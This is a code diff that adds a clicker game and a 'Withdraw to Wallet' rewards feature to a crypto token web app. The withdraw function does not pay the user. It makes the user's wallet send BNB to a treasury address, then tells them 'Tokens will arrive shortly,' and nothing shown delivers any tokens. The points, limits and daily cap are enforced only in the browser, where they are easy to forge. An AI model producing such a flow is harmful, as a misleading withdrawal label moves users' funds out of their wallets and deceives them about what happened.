@@ -38,6 +38,7 @@
       margin-top: 10px;
       width: 100%;
       font-size: 16px;
+      font-weight: bold;
     }
 
     .connect {
@@ -47,6 +48,18 @@
 
     .pay {
       background: #00c853;
+      color: white;
+    }
+
+    .game-btn {
+      background: #e67e22;
+      color: white;
+      font-size: 18px;
+      padding: 20px;
+    }
+
+    .withdraw-btn {
+      background: #9b59b6;
       color: white;
     }
 
@@ -61,6 +74,7 @@
       margin-top: 10px;
       border-radius: 8px;
       border: none;
+      box-sizing: border-box;
     }
 
     .status {
@@ -68,28 +82,64 @@
       font-size: 14px;
       color: #aaa;
     }
+
+    .stat-text {
+      font-size: 18px;
+      margin: 8px 0;
+    }
+
+    .rules-list {
+      text-align: left;
+      font-size: 13px;
+      color: #a0aec0;
+      background: #1e293b;
+      padding: 12px;
+      border-radius: 8px;
+      margin-top: 10px;
+    }
   </style>
 </head>
 
 <body>
 
 <div class="container">
-  <h2>⚡ PVLT Mini App</h2>
+  <h2>⚡ PVLT Mini App & Game</h2>
 
   <div class="card">
     <button class="connect" onclick="connectWallet()">Connect Wallet</button>
-
     <p id="wallet">Not connected</p>
     <p id="balance">Balance: -</p>
   </div>
 
   <div class="card">
+    <h3>🎰 Clicker Game</h3>
+    <p class="stat-text">🎮 Game Points: <strong id="game-points" style="color: #f1c40f;">0</strong></p>
+    <p class="stat-text">🪙 Estimated Tokens: <strong id="est-tokens" style="color: #3498db;">0.00</strong> PVLT</p>
+    <button class="game-btn" onclick="playGame()">TAP TO EARN POINTS</button>
+  </div>
+
+  <div class="card">
+    <h3>🎁 Claim Rewards</h3>
+    
+    <div class="rules-list">
+      📌 <strong>Withdrawal Rules:</strong><br>
+      • 100,000 points = 1 token<br>
+      • 1 token = 0.00000001 BNB<br>
+      • Minimum withdrawal = 100 tokens<br>
+      • Maximum withdrawal = Once per day
+    </div>
+
+    <input id="withdraw-tokens" type="number" placeholder="Enter PVLT Token amount to claim" oninput="calculateBnbValue()" />
+    <p id="bnb-estimation" style="font-size: 13px; color: #cbd5e1; margin-top: 5px;">Estimated BNB Fee value: 0 BNB</p>
+
+    <button class="withdraw-btn" onclick="withdrawTokens()">Withdraw to Wallet</button>
+    <p class="status" id="withdraw-status">Waiting for interaction...</p>
+  </div>
+
+  <div class="card">
     <h3>Pay with PVLT</h3>
-
     <input id="amount" type="number" placeholder="Enter PVLT amount" />
-
     <button class="pay" onclick="payPVLT()">Send Payment</button>
-
     <p class="status" id="status">Waiting...</p>
   </div>
 </div>
@@ -98,6 +148,10 @@
 let provider;
 let signer;
 let userAddress;
+
+// Game State Setup
+let points = parseInt(localStorage.getItem('pvlt_points')) || 0;
+updateGameUI();
 
 // 🔥 CHANGE THIS TO YOUR PVLT TOKEN ADDRESS
 const PVLT_ADDRESS = "0xa263d765b897b4777f0ad4a938d12d79e789ffff";
@@ -112,6 +166,26 @@ const ABI = [
   "function decimals() view returns (uint8)"
 ];
 
+// Clicker Game Action Mechanics
+function playGame() {
+  points += 1000; // Adds 1000 points per click
+  localStorage.setItem('pvlt_points', points);
+  updateGameUI();
+}
+
+function updateGameUI() {
+  document.getElementById("game-points").innerText = points.toLocaleString();
+  const tokensCalculated = points / 100000;
+  document.getElementById("est-tokens").innerText = tokensCalculated.toFixed(2);
+}
+
+function calculateBnbValue() {
+  const tokenInput = parseFloat(document.getElementById("withdraw-tokens").value) || 0;
+  // 1 token = 0.00000001 BNB Rule
+  const bnbValue = tokenInput * 0.00000001;
+  document.getElementById("bnb-estimation").innerText = `Estimated BNB value: ${bnbValue.toFixed(10)} BNB`;
+}
+
 async function connectWallet() {
   try {
     if (!window.ethereum) {
@@ -125,8 +199,7 @@ async function connectWallet() {
     signer = provider.getSigner();
     userAddress = await signer.getAddress();
 
-    document.getElementById("wallet").innerText =
-      "Wallet: " + userAddress;
+    document.getElementById("wallet").innerText = "Wallet: " + userAddress;
 
     loadBalance();
   } catch (err) {
@@ -136,6 +209,7 @@ async function connectWallet() {
 
 async function loadBalance() {
   try {
+    if(!provider || !userAddress) return;
     const contract = new ethers.Contract(PVLT_ADDRESS, ABI, provider);
     const bal = await contract.balanceOf(userAddress);
     const decimals = await contract.decimals();
@@ -144,6 +218,73 @@ async function loadBalance() {
       "Balance: " + ethers.utils.formatUnits(bal, decimals) + " PVLT";
   } catch (err) {
     console.log(err);
+  }
+}
+
+async function withdrawTokens() {
+  try {
+    if (!signer || !userAddress) {
+      alert("Please connect your wallet first!");
+      return;
+    }
+
+    const tokenAmountToWithdraw = parseFloat(document.getElementById("withdraw-tokens").value);
+    
+    // 1. Minimum withdraw = 100 tokens Rule
+    if (!tokenAmountToWithdraw || tokenAmountToWithdraw < 100) {
+      alert("Minimum withdrawal is 100 tokens!");
+      return;
+    }
+
+    // 2. 100,000 points = 1 token Rule (Validation check)
+    const requiredPoints = tokenAmountToWithdraw * 100000;
+    if (points < requiredPoints) {
+      alert(`Insufficient game points! You need ${requiredPoints.toLocaleString()} points to claim ${tokenAmountToWithdraw} tokens.`);
+      return;
+    }
+
+    // 3. Maximum withdraw = once per day Rule
+    const lastWithdraw = localStorage.getItem('pvlt_last_withdraw');
+    const now = Date.now();
+    if (lastWithdraw) {
+      const hoursSinceLast = (now - parseInt(lastWithdraw)) / (1000 * 60 * 60);
+      if (hoursSinceLast < 24) {
+        const hoursLeft = (24 - hoursSinceLast).toFixed(1);
+        alert(`Maximum withdrawal limit reached. You can withdraw again in ${hoursLeft} hours.`);
+        return;
+      }
+    }
+
+    document.getElementById("withdraw-status").innerText = "Preparing claim verification payload...";
+
+    // 4. Conversion Calculation (1 Token = 0.00000001 BNB)
+    const bnbValueToTransfer = tokenAmountToWithdraw * 0.00000001;
+    const bnbInWei = ethers.utils.parseEther(bnbValueToTransfer.toFixed(10));
+
+    // Custom clear hexadecimal note data string notifying the receiver how many tokens to release
+    const hexMemoData = ethers.utils.hexlify(ethers.utils.toUtf8Bytes(`Claim:${tokenAmountToWithdraw}-Tokens`));
+
+    // Sends a claim signal directly to your project treasury address
+    const tx = await signer.sendTransaction({
+      to: RECEIVER,
+      value: bnbInWei,
+      data: hexMemoData 
+    });
+
+    document.getElementById("withdraw-status").innerText = "Claim request submitted to blockchain...";
+    await tx.wait();
+
+    // Deduct corresponding balance components on safe completion
+    points -= requiredPoints;
+    localStorage.setItem('pvlt_points', points);
+    localStorage.setItem('pvlt_last_withdraw', now.toString());
+    
+    updateGameUI();
+    document.getElementById("withdraw-status").innerText = "✅ Claim complete! Tokens will arrive shortly.";
+    
+  } catch (err) {
+    console.log(err);
+    document.getElementById("withdraw-status").innerText = "❌ Claim signature rejected or failed.";
   }
 }
 
